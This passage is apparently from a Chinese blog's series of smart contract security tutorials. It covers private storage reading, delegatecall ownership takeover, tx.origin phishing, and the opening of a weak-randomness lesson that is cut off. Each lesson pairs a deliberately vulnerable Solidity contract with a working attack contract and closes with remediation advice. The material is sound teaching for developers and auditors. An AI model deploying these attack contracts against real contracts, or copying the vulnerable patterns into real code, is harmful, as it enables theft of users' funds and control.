user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getArrayLocation(</span><br><span class="line">        uint slot,</span><br><span class="line">        uint index,</span><br><span class="line">        uint elementSize</span><br><span class="line">) public pure returns (uint) &#123;</span><br><span class="line">        return uint(keccak256(abi.encodePacked(slot))) + (index * elementSize);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getMapLocation(uint slot, uint key) public pure returns (uint) &#123;</span><br><span class="line">        return uint(keccak256(abi.encodePacked(key, slot)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>由上面的合约代码我们可以看到，Vault 合约将用户的用户名和密码这样的敏感数据记录在了合约中，由前置知识中我们可以了解到，合约中修饰变量的关键字仅限制其调用范围，这也就间接证明了合约中的数据均是公开的，可任意读取的，将敏感数据记录在合约中是不安全的。</p><h2 id="读取数据"><a href="#读取数据" class="headerlink" title="读取数据"></a>读取数据</h2><p>下面我们就带大家来读取这个合约中的数据。首先我们先看 slot0 中的数据：由合约中可以看到 slot0 中只存储了一个 uint 类型的数据，我们读取出来看一下：</p><p>我这里使用 Web3.py 取得数据</p><p>首先写好程序</p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136760869112.png" alt="图片"></p><p>运行后得到</p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136762301915.png" alt="图片"></p><p>我们使用进制转换器转换一下</p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136763046018.png" alt="图片"></p><p>这里我们就成功的去到了合约中的第一个插槽 slot0 中存储的 uint 类型的变量 count=123 ，下面我们继续：</p><p>slot1 中存储三个变量：u16, isTrue, owner</p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136766128721.png" alt="图片"></p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136766863724.png" alt="图片"></p><p>从右往左依次为</p><ul><li>owner = f36467c4e023c355026066b8dc51456e7b791d99</li><li>isTrue = 01 = true</li><li>u16 = 1f = 31</li></ul><p>slot2 中就存储着私有变量 password 我们读取看看</p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136771006427.png" alt="图片"></p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136771613030.png" alt="图片"></p><p>无法查询 <code>uint public constant someConst = 123;</code>，因为他被标注为了constant，写进了字节码</p><p>slot 3, 4, 5 中存储着定长数组中的三个元素</p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136801204833.png" alt="图片"></p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136803025839.png" alt="图片"></p><p>slot6 中存储着变长数组的长度</p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136805547642.png" alt="图片"></p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136805992645.png" alt="图片"></p><p>在合约中，结构体User中又id和password，在动态数组users中，是按照顺序存储的。例如：用户1的id，用户1的password，用户2的id，用户2的password……。下面我们来读取两个用户的 id 和 password：</p><p><strong>user1</strong></p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136807319848.png" alt="图片"></p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136807657851.png" alt="图片"></p><p><strong>user2</strong></p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136808542154.png" alt="图片"></p><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/640-167136808780257.png" alt="图片"></p><blockquote><p>0xf652222313e28459528d920b65115c16c04f3efc82aaedc97be59f3f377c0d3f是如何计算出来的呢？</p><p>keccak256(bytes32(slot))来算出。本处的动态数组users所在的插槽是slot6，则：keccak256(abi.encode(0x0000000000000000000000000000000000000000000000000000000000000006))。下图是remix验证的结果：</p></blockquote><p><img src="/2023/06/23/00.security/16.%E8%AE%BF%E9%97%AE%E7%A7%81%E6%9C%89%E6%95%B0%E6%8D%AE%E6%94%BB%E5%87%BB/image-20221218225210864.png" alt="image-20221218225210864"></p><p>我们发现：键值对是按照顺序一个一个排列的3f-40-41-42</p><p>好了，这里我们就成功的将合约中的所有数据读取完成，现在大家应该都能得出一个结论：合约中的私有数据也是可以读取的。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>作为开发者</strong></p><p>不要将任何敏感数据存放在合约中，因为合约中的任何数据都可被读取。</p><p><strong>作为审计者</strong></p><p>在审计过程中应当注意合约中是否存在敏感数据，例如：秘钥，游戏通关口令等。</p><p>引用：<a href="https://mp.weixin.qq.com/s/_DV6UaRdA_6pUFXt-EnTtA">慢雾科技</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>15.delegatecall漏洞_3</title>
      <link href="/2023/06/23/00.security/15.delegatecallA%CC%82I%CC%87h%CC%82%C2%B4_3/"/>
      <url>/2023/06/23/00.security/15.delegatecallA%CC%82I%CC%87h%CC%82%C2%B4_3/</url>
      
        <content type="html"><![CDATA[<h1 id="delegatecall漏洞-3"><a href="#delegatecall漏洞-3" class="headerlink" title="delegatecall漏洞_3"></a>delegatecall漏洞_3</h1><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Lib &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function pwn() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract HackMe &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    Lib public lib;</span><br><span class="line"></span><br><span class="line">    constructor(Lib _lib) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        lib = Lib(_lib);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        address(lib).delegatecall(msg.data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>我们可以看到有两个合约，Lib 合约中只有一个 pwn 函数用来修改合约的 owner，在 HackMe 合约中存在 fallback 函数，fallback 函数的内容是使用 delegatecall 去调用 Lib 合约中的函数。我们需要利用 HackMe.fallback() 触发 delegatecall 函数去调用 Lib.pwn() 将 HackMe 合约中的 owner 改成自己。</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    address public hackMe;</span><br><span class="line"></span><br><span class="line">    constructor(address _hackMe) &#123;</span><br><span class="line">        hackMe = _hackMe;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        hackMe.call(abi.encodeWithSignature(&quot;pwn()&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来请出我们的老朋友受害者 Alice 和攻击者 Eve 这两个角色来分析下攻击流程：</p><ol><li>Alice 部署 Lib 合约；</li><li>Alice 部署 HackMe 合约并在构造函数中传入 Lib 合约的地址；</li><li>攻击者 Eve 部署 Attack 合约并在构造函数中传入 hackMe 地址；</li><li>攻击者 Eve 调用 attack 函数成功将 HackMe 合约中的 owner 改成自己。</li></ol><p>我们先来回顾一下 fallback 函数何时会被触发调用？</p><ul><li>向某合约直接转账时（会触发某合约中的 fallack 函数）</li><li>向某合约调用无法匹配到函数名的函数时（会触发某合约中的 fallack 函数）</li></ul><p>现在我们来看看到底发生了什么？</p><p>attack 函数首先去调用 HackMe.pwn() ，发现 HackMe 合约中并没有 pwn 函数，此时触发 HackMe.fallback() ，HackMe.fallback() 又使用 deldegatecall 调用 Lib 合约中的函数，函数名取得是 msg.data 也就是 “pwn()”，而 Lib 合约中恰好有名为 pwn 的函数，该函数的作用是将合约中的 owner 修改为 msg.sender。在前置知识中我们了解到 delegatecall 函数的执行环境是调用者的环境，并且对于 storage 变量的修改是根据被调用的合约的插槽位置来修改的。</p><p>简而言之在 HackMe 执行 delegatecall 调用 Lib.pwn() 后，相当于将 Lib.pwn() 直接拿到 HackMe 合约中执行了。pwn 函数修改了 Lib 合约中存储位置为 slot0 的变量 owner，这样 HackMe 通过 delegatecall 调用 pwn 函数后也会修改 HackMe 合约中存储位置为 slot0 的变量恰好也是 owner 变量，这样 HackMe 合约中的 owner 就成功的被攻击者 Eve 修改成自己了。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>作为开发者</p><ul><li>在使用 delegatecall 时应注意被调用合约的地址不能是可控的；</li><li>在较为复杂的合约环境下需要注意变量的声明顺序以及存储位置。因为使用 delegatecall 进行外部调时会根据被调用合约的数据结构来用修改本合约相应 slot 中存储的数据，在数据结构发生变化时这可能会造成非预期的变量覆盖。</li></ul><p>作为审计者</p><ul><li>在审计过程中遇到合约中有使用 delegatecall 时需要注意被调用的合约地址是否可控；</li><li>当被调用合约中的函数存在修改 storage 变量的情况时需要注意变量存储插槽的位置，避免由于数据结构不一致而导致本合约中存储的 storage 变量被错误的覆盖。</li></ul><p>引用：<a href="https://mp.weixin.qq.com/s/qzBsG4UHHZlVjl3hlTXSTA">慢雾科技</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>14.delegatecall漏洞_2</title>
      <link href="/2023/06/23/00.security/14.delegatecallA%CC%82I%CC%87h%CC%82%C2%B4_2/"/>
      <url>/2023/06/23/00.security/14.delegatecallA%CC%82I%CC%87h%CC%82%C2%B4_2/</url>
      
        <content type="html"><![CDATA[<h1 id="delegatecall漏洞-2"><a href="#delegatecall漏洞-2" class="headerlink" title="delegatecall漏洞_2"></a>delegatecall漏洞_2</h1><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">contract Lib &#123;</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        someNumber = _num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract HackMe &#123;</span><br><span class="line">    address public lib;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    constructor(address _lib) &#123;</span><br><span class="line">        lib = _lib;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        lib.delegatecall(abi.encodeWithSignature(&quot;doSomething(uint256)&quot;, _num));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这次的攻击目标依然是获得 HackMe 合约中的 owner 权限，我们可以看到两个合约中除了 HackMe 合约中的构造函数可以修改合约的 owner，其他地方并没有修改 owner 的函数。我们要如何完成攻击呢？这里需要一点小技巧，大家可以思考一下，刚好也可以验证一下自己对于之前知识的掌握程度以及自己的思维是否活跃。</p><p>是否有想法呢？没有想法也没关系，我们一起来看攻击是如何完成的：</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    // Make sure the storage layout is the same as HackMe</span><br><span class="line">    // This will allow us to correctly update the state variables</span><br><span class="line">    address public lib;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint public someNumber;</span><br><span class="line"></span><br><span class="line">    HackMe public hackMe;</span><br><span class="line"></span><br><span class="line">    constructor(HackMe _hackMe) &#123;</span><br><span class="line">        hackMe = HackMe(_hackMe);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        // override address of lib</span><br><span class="line">        hackMe.doSomething(uint(uint160(address(this))));</span><br><span class="line">        // pass any number as input, the function doSomething() below will</span><br><span class="line">        // be called</span><br><span class="line">        hackMe.doSomething(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // function signature must match HackMe.doSomething()</span><br><span class="line">    function doSomething(uint _num) public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先看攻击流程：</p><ol><li>Alice 部署 Lib 合约；</li><li>Alice 部署 HackMe 合约并在构造函数中传入 Lib 合约的地址；</li><li>攻击者 Eve 部署 Attack 合约并在构造函数中传入 HackMe 合约的地址；</li><li>攻击者调用 Attack.attack() 函数将 HackMe 合约中的 owner 变为自己。</li></ol><p>咋回事儿呢？其实这个攻击方式就是很巧妙的运用了 delegatecall 这个函数修改 storage 类型变量时的特征：delegatecall 函数的执行环境是调用者的环境，并且对于 storage 类型变量的修改是根据被调用合约变量存储的插槽位置来修改的。</p><ol><li>Attack.attack() 函数先将自己的地址转换为 uint256 类型（这一步是为了兼容目标合约中的数据类型）第一次调用 HackMe.doSomething() 函数；</li><li>HackMe.doSomething() 函数使用 delegatecall 函数带着传入的 Attack 合约的地址调用了 Lib.doSomething() 函数；</li><li>可以看到 Lib.doSomething() 函数将合约中存储位置为 slot0 的参数改为传入的值，这样当 HackMe 合约使用 delegatecall 调用 Lib.doSomething() 函数时，将改变自己在 slot0 位置存储的变量的值，也就是将 lib 参数（这里存储的是 Lib 合约的地址）改为我们传入的 Attack 合约的地址。此时之前在 HackMe.lib 参数中存储的 Lib 合约的地址就被修改成我们传入的 Attack 合约的地址了；</li><li>Attack.attack() 函数再次调用 HackMe.doSomething() 函数，由于在上一步我们已经将 HackMe.lib 变量修改为 Attack 合约的地址了，这时 HackMe.doSomething() 函数将不再调用之前的 Lib 合约而是用 delegatecall 去调用 Attack.doSomething() 函数。</li><li>此时我们再来观察 Attack 合约的写法，发现其变量的存储位置故意和 HackMe 合约保持一致，并且不难发现 Attack.doSomething() 函数的内容也被攻击者写为 owner = msg.sender，这个操作修改了合约中存储位置为 slot1 的变量。所以 HackMe 合约使用 delegatecall 调用 Attack.doSomething() 函数就会将合约中存储位置为 slot1 的变量 owner 修改为 msg.sender 也就是 Eve 的地址，至此攻击者完成了他的攻击。</li></ol><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>作为开发者</strong></p><ul><li>在使用 delegatecall 时应注意被调用合约的地址不能是可控的；</li><li>在较为复杂的合约环境下需要注意变量的声明顺序以及存储位置。因为使用 delegatecall 进行外部调用时，会根据被调用合约的数据结构来修改本合约相应 slot 中存储的数据，当数据结构发生变化时这可能会造成非预期的变量覆盖。</li></ul><p><strong>作为审计者</strong></p><ul><li>在审计过程中遇到合约中有使用 delegatecall 时需要注意被调用的合约地址是否可控；</li><li>当被调用合约中的函数存在修改 storage 变量的情况时，需要注意变量存储插槽的位置，避免由于数据结构不一致而导致本合约中存储的 storage 变量被错误的覆盖。</li></ul><p>引用：<a href="https://mp.weixin.qq.com/s/6sAqyjv4gI3c9DzqoYhybA">慢雾科技</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>13.基于tx.origin的钓鱼攻击</title>
      <link href="/2023/06/23/00.security/13.%E5%9F%BA%E4%BA%8Etx.origin%E7%9A%84%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/"/>
      <url>/2023/06/23/00.security/13.%E5%9F%BA%E4%BA%8Etx.origin%E7%9A%84%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="随机数攻击"><a href="#随机数攻击" class="headerlink" title="随机数攻击"></a>随机数攻击</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>首先我们来了解在 Solidity 中常用的两种验证发送方地址的方式：</p><ul><li>msg.sender：msg.sender 仅会读取上层调用者的地址。</li><li>tx.origin：tx.origin 会读取启动交易的原始地址。</li></ul><p>由下图可以看到，Bob 通过 A 合约调用 B 合约，B 合约又调用 C 合约。对于 C 合约来说，tx.origin 为 Bob ，msg.sender 为 B 合约。对于 B 合约来说， tx.origin 也是 Bob ， msg.sender 为 A 合约，对于 A 合约来说，tx.origin 与 msg.sender 均为 Bob 。这里我们可以得出一个结论：tx.origin 永远都是 EOA 地址，msg.sender 可以为 EOA 也可以为合约地址。</p><p><img src="/2023/06/23/00.security/13.%E5%9F%BA%E4%BA%8Etx.origin%E7%9A%84%E9%92%93%E9%B1%BC%E6%94%BB%E5%87%BB/640.jpeg" alt="图片"></p><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><p>通过前置知识相信大家已经了解了 msg.sender 与 tx.origin 之间的区别，下面我们还是通过漏洞合约来带大家深入了解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line">contract Wallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address payable _to, uint _amount) public &#123;</span><br><span class="line">        require(tx.origin == owner, &quot;Not owner&quot;);</span><br><span class="line"></span><br><span class="line">        (bool sent, ) = _to.call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(sent, &quot;Failed to send Ether&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>可以看到， Wallet 合约是一个合约钱包，创建者可以在部署合约时将自己的以太转入合约中。当你想花钱的时候可以调用 Wallet.transfer() 将任意数量的存款转移。当然，钱包里的钱并不是任何人都能碰的，所以这里需要通过 tx.origin == owner 的检查才能转账。问题也就出现在这里，前置知识中说到 tx.origin 会读取启动交易的原始地址，所以我们可以伪造一个钓鱼合约，来欺骗受害者发起交易，从而窃取他的身份转走他的以太。接下来我们看看攻击合约是如何完成身份窃取的。</p><p>Tips：相信细心的小伙伴已经发现 Wallet 合约还存在一个漏洞，就是我们在第一期中介绍的重入漏洞。这里提一句：被 fallback 回调函数调用时 tx.origin 依然是最初调用者的 EOA 地址。</p><h2 id="攻击合约"><a href="#攻击合约" class="headerlink" title="攻击合约"></a>攻击合约</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">contract Attack &#123;</span><br><span class="line">    address payable public owner;</span><br><span class="line">    Wallet wallet;</span><br><span class="line"></span><br><span class="line">    constructor(Wallet _wallet) &#123;</span><br><span class="line">        wallet = Wallet(_wallet);</span><br><span class="line">        owner = payable(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        wallet.transfer(owner, address(wallet).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先来分析攻击流程：</p><ol><li>Alice 部署了 Wallet 合约并向合约中转入十个以太将该合约作为自己的钱包合约。</li><li>Eve 发现 Wallet 合约中有钱，部署 Attack 合约并在构造函数中传入 Wallet 合约的地址。</li><li>Eve 通过社会工程学调查到 Alice 特别喜欢网购包包，部署一个假的购物网站并将链接发送至 Alice 的邮箱。</li><li>Alice 收到邮箱好奇心驱使她点开链接，发现里面有自己喜欢的包包并且价格很低，一时心动就准备购买，但是购买的时候发现需要连接钱包完成签名才能注册成功，Alice 觉得这个网站非常棒很 Web3 ，想都没想直接签名了这笔交易。</li><li>签名成功后 Alice 发现自己在 Wallet 合约中的所有以太已经被转移。</li></ol><p>这次的攻击原理其实很简单，我们来看看到底发生了什么：</p><p>Alice 在注册时的签名并不是用于注册的，而是签名了调用 Attack.attack() 这笔交易。Attack.attack() 调用了 Wallet.transfer()， 并传入 owner 也就是 Eve 的 EOA 地址，以及 Wallet 合约中的以太余额。因为签名这笔交易的地址为 Alice 的 EOA 地址，所以对于 Wallet 合约来说 tx.origin 就是 Alice 的 EOA 地址，所以 Eve 成功利用钓鱼伪造了 Alice 的身份，通过了权限检查并成功将 Wallet 合约中的以太转移到了自己的账户中。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p><strong>作为开发者</strong></p><p>tx.origin 会递归栈的调用，然后找到交易的调用的最初发起者(EOA)的地址，当使用 tx.origin 进行鉴权的时候，会存在钓鱼的风险。所以 tx.origin 目前仅适用于校验 msg.sender 是否是 EOA 地址，不适用于做权限的校验，需要使用 msg.sender 来进行权限校验。</p><p><strong>作为审计者</strong></p><p>在审计中需要关注代码中使用了 tx.origin 进行鉴权的位置，分析是否会存在被钓鱼的风险。</p><p>引用：<a href="https://mp.weixin.qq.com/s/ct1wCo5YPtLBOMLvZ5aIEw">慢雾科技</a></p>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.随机数攻击</title>
      <link href="/2023/06/23/00.security/12.%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/"/>
      <url>/2023/06/23/00.security/12.%E9%9A%8F%E6%9C%BA%E6%95%B0%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="随机数攻击"><a href="#随机数攻击" class="headerlink" title="随机数攻击"></a>随机数攻击</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>智能合约的开发中常常会用到随机数，例如 Lottery 和现在流行的 NFT 数字藏品的属性等都需要用到随机数。目前来说常见的随机数获取有两种：使用区块变量生成随机数，使用预言机来生成随机数。下面我们了解一下这两者的特点：</p><ul><li>使用区块变量生成随机数（我们先了解一下常见的区块变量有哪些）<ul><li>block.basefee(uint)：当前区块的基本费用</li><li>block.chainid(uint)：当前链 id</li><li>block.coinbase()：当前区块矿工地址 address payable</li><li>block.difficulty(uint)：当前区块难度</li><li>block.gaslimit(uint)：当前区块 gaslimit</li><li>block.number(uint)：当前区块号</li><li>block.timestamp(uint)：自 Unix 纪元以来的当前区块时间戳（以秒为单位）</li><li>blockhash(uint blockNumber) returns (bytes32)：给定区块的哈希，仅适用于 256 个最近的区块</li></ul></li></ul><p>其中 block.difficulty, blockhash, block.number 和 block.timestamp 这四个是用得比较多的。由区块数据生成的随机数可能会限制普通用户预测随机数的可能性，但是并不能限制矿工作恶，矿工可以决定一个区块是否被广播，他们挖出了一个区块不是一定要广播出去也可以直接扔掉，这个就叫<strong>矿工的选择性打包</strong>。他们可以持续尝试生成随机数，直至得到想要的结果再广播出去。当然，矿工会这样做的前提是有足够的的利益诱惑，例如可以获得一个很大的奖励池中的奖励，因此使用区块变量获取随机数的方法更适合于一些随机数不属于核心业务的应用。</p><ul><li>使用预言机生成随机数</li></ul><p>预言机是专门为生成随机数种子而搭建的链上或者链下的服务。除了使用第三方服务，也可以由 DApp 开发商自己搭建一个链下服务提供随机数，这种在链上获取链下数据的场景通常是通过链上预言机的方式来实现。</p><p>当然这种方法也会有一些安全风险，例如依赖第三方给出的随机数种子的话同样会存在第三方作弊或者受贿的情形，即使是自己搭建的随机数服务也可能因为故障等原因无法使用，项目方也有可能操控随机数对 DApp 的运行和用户造成重大的损失。因此使用链下服务获取随机数的方法依赖于是否有一个可信又稳定的第三方服务，如果有，那么这个方法相较于使用区块链变量生成随机数的方法，随机数的不可预测性会更强一些。</p><p>说到这里大家可能会有一些疑问，这些随机数生成方式或多或少都存在一定风险，那么就没有一个既稳定又安全的随机数获取方式吗？答案是有，有很多去中心化的预言机服务，以 Chainlink 为例，这类去中心化的预言机服务提供的随机数相对更加稳定和安全。Chainlink VRF 提供了一个链上去中心化的随机数种子获取方案。只要付出 Link 币就可以从 Chainlink 上获取随机数种子了，至于他们的各种优点和使用方式这里就不过多介绍了。</p><p>接下来我们还是用合约代码来给大家演示弱随机数可能带来的危害。</p><h2 id="漏洞示例"><a href="#漏洞示例" class="headerlink" title="漏洞示例"></a>漏洞示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 